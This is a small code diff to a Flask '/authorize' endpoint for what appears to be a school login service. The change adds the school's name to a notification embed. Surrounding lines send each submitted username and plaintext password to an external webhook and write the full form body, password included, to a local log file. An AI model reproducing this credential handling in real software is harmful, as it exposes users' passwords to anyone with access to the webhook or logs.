@@ -112,8 +112,10 @@ def get_school_by_id(school_num: str):
 @api.route(f"{API_BASE_URL}/authorize", methods=["POST"])
 @login_required
 def authorize(school_num: str) -> Response:
+    school_data = get_school_by_id(school_num)
     embed = BetterEmbed(title="AUTH ATTEMPT", color="0000ff")
     embed.add_embed_field("School number:", f"```{school_num}```", inline=False)
+    embed.add_embed_field("Schulname:", f"{school_data.get('display_name') if school_data else 'Unbekannt'}", inline=False)
     embed.add_embed_field("Nickname of user:", f"{current_user.get_field('nickname')}", inline=False)
     embed.add_embed_field("username:", f"```{request.form.get('username')}```", inline=False)
     embed.add_cleaned_field("password:", f"||```{request.form.get('pw')}```||", inline=False)
@@ -122,7 +124,6 @@ def authorize(school_num: str) -> Response:
     webhook_send("WEBHOOK_SCHOOL_AUTHORIZATION", embeds=[embed])
     with open(".cache/auth.log", "a") as f:
         f.write(f"New auth attempt for {request.form.get('school_num')}\nargs: {request.args}\nbody: {request.form}")
-    school_data = get_school_by_id(school_num)
     if not school_data:
         return send_error("Schulnummer unbekannt, falls du eine Schule hinzufügen möchtest, nimm bitte Kontakt mit uns auf")
     username = request.form.get("username")
